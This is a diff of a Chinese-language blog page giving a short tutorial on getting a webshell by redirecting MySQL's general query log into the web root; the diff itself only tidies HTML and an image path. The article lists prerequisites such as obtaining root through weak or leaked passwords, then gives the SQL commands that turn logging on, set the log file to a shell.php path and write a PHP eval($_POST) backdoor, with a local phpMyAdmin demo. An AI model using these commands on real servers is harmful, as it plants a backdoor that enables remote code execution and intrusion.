@@ -253,12 +253,12 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="一、前提"><a href="#一、前提" class="headerlink" title="一、前提"></a>一、前提</h2><p><b>版本：Mysql 5.0 + <b></p>
+        <h2 id="一、前提"><a href="#一、前提" class="headerlink" title="一、前提"></a>一、前提</h2><p><b>版本：Mysql 5.0 + <b></b></b></p>
 <p><b>前提：获取数据库root权限(弱口令、密码泄露等方式)、知道网站的绝对路径(不知道的情况下可以使用“select @@datadir;”根据数据库的路径来猜测web路径)</b></p>
 <h2 id="二、攻击命令："><a href="#二、攻击命令：" class="headerlink" title="二、攻击命令："></a>二、攻击命令：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;; \\查看日志是否开启</span><br><span class="line"></span><br><span class="line">SET GLOBAL general_log&#x3D;&#39;on&#39;; \\开启日志记录</span><br><span class="line"></span><br><span class="line">set global general_log_file&#x3D;&#39;D:\\phpStudy\\WWW\\shell.php&#39;; \\修改日志路径 (注意这里是双线)</span><br><span class="line"></span><br><span class="line">select &quot;&lt;?php eval($_POST[&#39;gg&#39;]);?&gt;&quot;; \\写入shell</span><br></pre></td></tr></table></figure>
 
 <h2 id="三、-实战演示"><a href="#三、-实战演示" class="headerlink" title="三、 实战演示"></a>三、 实战演示</h2><p>这里利用phpmyadmin本地搭建环境进行演示</p>
-<p><img src="1.png"></p>
+<p><img src="/.com//1.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
